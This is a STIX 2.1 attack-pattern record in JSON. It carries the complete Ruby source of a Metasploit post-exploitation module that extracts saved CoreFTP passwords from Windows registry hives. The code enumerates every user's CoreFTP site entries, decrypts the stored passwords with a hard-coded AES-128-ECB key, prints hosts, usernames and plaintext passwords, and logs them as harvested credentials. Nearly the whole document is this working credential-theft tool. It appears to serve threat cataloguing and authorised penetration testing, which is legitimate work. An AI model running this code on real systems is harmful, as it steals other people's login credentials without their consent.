{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c7cbfc00-f5d9-4865-9ede-b3b314ab00de",
    "created": "2024-08-14T16:33:08.764755Z",
    "modified": "2024-08-14T16:33:08.764759Z",
    "name": "Windows Gather CoreFTP Saved Password Extraction",
    "description": " This module extracts saved passwords from the CoreFTP FTP client. These passwords are stored in the registry. They are encrypted with AES-128-ECB. This module extracts and decrypts these passwords.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/coreftp.rb",
            "external_id": "coreftp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather CoreFTP Saved Password Extraction',\n        'Description' => %q{\n          This module extracts saved passwords from the CoreFTP FTP client. These\n          passwords are stored in the registry. They are encrypted with AES-128-ECB.\n          This module extracts and decrypts these passwords.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def run\n    userhives = load_missing_hives\n    userhives.each do |hive|\n      next if hive['HKU'].nil?\n\n      print_status(\"Looking at Key #{hive['HKU']}\")\n      begin\n        subkeys = registry_enumkeys(\"#{hive['HKU']}\\\\Software\\\\FTPware\\\\CoreFTP\\\\Sites\")\n        if subkeys.nil? || subkeys.empty?\n          print_status('CoreFTP not installed for this user.')\n          next\n        end\n\n        subkeys.each do |site|\n          site_key = \"#{hive['HKU']}\\\\Software\\\\FTPware\\\\CoreFTP\\\\Sites\\\\#{site}\"\n          host = registry_getvaldata(site_key, 'Host') || ''\n          user = registry_getvaldata(site_key, 'User') || ''\n          port = registry_getvaldata(site_key, 'Port') || ''\n          epass = registry_getvaldata(site_key, 'PW')\n          next if epass.nil? || (epass == '')\n\n          pass = decrypt(epass)\n          pass = pass.gsub(/\\x00/, '') if !pass.nil? && (pass != '')\n          print_good(\"Host: #{host} Port: #{port} User: #{user}  Password: #{pass}\")\n\n          service_data = {\n            address: host,\n            port: port,\n            service_name: 'ftp',\n            protocol: 'tcp',\n            workspace_id: myworkspace_id\n          }\n\n          credential_data = {\n            origin_type: :session,\n            session_id: session_db_id,\n            post_reference_name: refname,\n            private_type: :password,\n            private_data: pass,\n            username: user\n          }\n\n          credential_data.merge!(service_data)\n\n          # Create the Metasploit::Credential::Core object\n          credential_core = create_credential(credential_data)\n\n          # Assemble the options hash for creating the Metasploit::Credential::Login object\n          login_data = {\n            core: credential_core,\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }\n\n          # Merge in the service data and create our Login\n          login_data.merge!(service_data)\n          login = create_credential_login(login_data)\n        end\n      rescue StandardError\n        print_error(\"Cannot Access User SID: #{hive['HKU']}\")\n      end\n    end\n    unload_our_hives(userhives)\n  end\n\n  def decrypt(encoded)\n    cipher = [encoded].pack('H*')\n    aes = OpenSSL::Cipher.new('AES-128-ECB')\n    aes.decrypt\n    aes.padding = 0\n    aes.key = 'hdfzpysvpzimorhk'\n    password = (aes.update(cipher) + aes.final).gsub(/\\x00/, '')\n    return password\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}